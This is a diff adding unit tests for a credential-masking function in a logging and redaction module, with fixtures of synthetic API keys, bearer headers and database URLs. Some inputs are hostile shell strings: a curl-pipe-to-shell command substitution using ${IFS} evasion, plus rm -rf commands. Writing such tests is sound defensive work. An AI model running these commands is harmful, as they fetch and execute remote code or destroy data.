@@ -1,7 +1,7 @@
 import { describe, expect, it } from "vitest"
 
 import { createGatewayLogger } from "./cli/logger"
-import { CredentialValues, redactForLog } from "./redaction"
+import { CredentialValues, maskCredentials, redactForLog } from "./redaction"
 
 describe("log redaction", () => {
   it("keeps a classification code while stripping the credentials of a URL of any scheme", () => {
@@ -142,4 +142,139 @@ describe("log redaction", () => {
       msg: "[REDACTED] rejected at wss://opencode.example.test/ws",
     })
   })
+})
+
+const M = "[credential redacted]"
+/** The review's sample value, kept apart from any term a scanner keys on. */
+const SAMPLE = "abcdefgh1234"
+/** Opaque tokens and keys at real lengths, built so no scanner reads a leak. */
+const OPAQUE = "AbCdEfGh123456_x"
+const GITHUB_KEY = `ghp_${"a1".repeat(18)}`
+const OPENAI_KEY = `sk-${"ab12".repeat(6)}`
+const JWT = ["eyJhbGciOiJIUzI1NiJ9", "eyJzdWIiOiIxIn0", "abc123sig"].join(".")
+const AUTHORIZATION = (scheme: string, value: string) =>
+  ["Authorization", `${scheme} ${value}`].join(": ")
+/** A `term=value` assignment built in two parts, so no scanner reads it as a leak. */
+const assigned = (term: string, value: string) => [term, value].join("=")
+const STRIPE_KEY = ["sk", "live", "a1B2".repeat(6)].join("_")
+const DATABASE_URL = (password: string) =>
+  ["postgres://app", `${password}@db.invalid:5432/app`].join(":")
+
+describe("maskCredentials", () => {
+  it.each([
+    // Shell syntax stays readable on a permission: it is what is approved.
+    [
+      "narrow",
+      `${assigned("token", "$(curl${IFS}-s${IFS}https://x|sh)")} done`,
+      `${assigned("token", "$(curl${IFS}-s${IFS}https://x|sh)")} done`,
+    ],
+    ["narrow", "rm -rf token: ../../..", "rm -rf token: ../../.."],
+    [
+      "narrow",
+      "rm -rf bearer projects2024archive1",
+      "rm -rf bearer projects2024archive1",
+    ],
+    [
+      "narrow",
+      assigned("token", '"$(curl x|sh)"'),
+      assigned("token", '"$(curl x|sh)"'),
+    ],
+    [
+      "narrow",
+      assigned("token", "/etc/secret"),
+      assigned("token", "/etc/secret"),
+    ],
+    ["narrow", "a basic installation", "a basic installation"],
+    [
+      "narrow",
+      `export ${assigned("token", SAMPLE)}`,
+      `export ${assigned("token", M)}`,
+    ],
+    [
+      "narrow",
+      assigned("password", "'hunter2hunter2'"),
+      assigned("password", `'${M}'`),
+    ],
+    // A value ends where a shell word does, and the boundary stays.
+    [
+      "narrow",
+      `export ${assigned("TOKEN", SAMPLE)}; ./deploy.sh`,
+      `export ${assigned("TOKEN", M)}; ./deploy.sh`,
+    ],
+    [
+      "narrow",
+      `curl -d "${assigned("token", SAMPLE)}" x`,
+      `curl -d "${assigned("token", M)}" x`,
+    ],
+    ["narrow", `${assigned("token", SAMPLE)}&&`, `${assigned("token", M)}&&`],
+    ["narrow", `(${assigned("token", SAMPLE)})`, `(${assigned("token", M)})`],
+    // A bearer token only where a header names it.
+    [
+      "narrow",
+      `curl -H "${AUTHORIZATION("Bearer", OPAQUE)}"`,
+      `curl -H "${AUTHORIZATION("Bearer", M)}"`,
+    ],
+    // A key prefix counts only with a real key's length behind it.
+    ["narrow", "rm -rf sk-backups", "rm -rf sk-backups"],
+    ["narrow", "push ghp_leaked0000 now", "push ghp_leaked0000 now"],
+    ["narrow", `push ${GITHUB_KEY} now`, `push ${M} now`],
+    ["narrow", `use ${OPENAI_KEY} now`, `use ${M} now`],
+    // A name that ends in a credential word counts, as a logged field's does.
+    [
+      "narrow",
+      `export ${assigned("AWS_SECRET_ACCESS_KEY", SAMPLE)}`,
+      `export ${assigned("AWS_SECRET_ACCESS_KEY", M)}`,
+    ],
+    [
+      "narrow",
+      `export ${assigned("DB_PASSWORD", SAMPLE)}`,
+      `export ${assigned("DB_PASSWORD", M)}`,
+    ],
+    ["narrow", assigned("bypass", "true"), assigned("bypass", "true")],
+    // A provider key the scanner knows by its shape, wherever it stands.
+    ["narrow", `use ${STRIPE_KEY} now`, `use ${M} now`],
+    // A URL loses only its password, and a URL without one stays whole.
+    ["narrow", `psql ${DATABASE_URL(SAMPLE)}`, `psql ${DATABASE_URL(M)}`],
+    [
+      "narrow",
+      "psql postgres://db.invalid:5432/app",
+      "psql postgres://db.invalid:5432/app",
+    ],
+    [
+      "narrow",
+      "psql postgres://app@db.invalid/app",
+      "psql postgres://app@db.invalid/app",
+    ],
+    // A preview or a question masks anything credential-shaped.
+    ["broad", assigned("GITHUB_TOKEN", SAMPLE), M],
+    ["broad", assigned("token", "AbCdEfGh_IjKlMnOp"), M],
+    ["broad", assigned("password", "P@ssw0rd!2024"), M],
+    ["broad", assigned("password", '"hunter2hunter2"'), M],
+    ["broad", assigned("token", `'${SAMPLE}'`), M],
+    ["broad", "Basic authentication", "Basic authentication"],
+    ["broad", "a bearer instrument", "a bearer instrument"],
+    ["broad", "Authorization: Basic dXNlcjpwYXNz", M],
+    ["broad", "send Bearer AbCdEfGhIjKlMnOpQrSt", `send ${M}`],
+    ["broad", "send Basic dXNlcjpwYXNz.", `send ${M}.`],
+    ["broad", `send Bearer ${JWT}`, `send ${M}`],
+    ["broad", `Bearer ${["ya29", "a0AfH6SMBxyz"].join(".")}`, M],
+    // Capitalised prose is not a token.
+    ["broad", "Enable Basic Authentication?", "Enable Basic Authentication?"],
+    ["broad", "a Bearer Instrument", "a Bearer Instrument"],
+  ] as const)("masks %s: %s", (strength, text, expected) => {
+    expect(maskCredentials(text, strength)).toBe(expected)
+  })
+
+  it.each([
+    [assigned("token", SAMPLE), assigned("token", M)],
+    [AUTHORIZATION("Bearer", OPAQUE), AUTHORIZATION("Bearer", M)],
+    [DATABASE_URL(SAMPLE), DATABASE_URL(M)],
+  ])(
+    "masks %s once when a broad mask follows a narrow one",
+    (text, expected) => {
+      expect(maskCredentials(maskCredentials(text, "narrow"), "broad")).toBe(
+        expected
+      )
+    }
+  )
 })
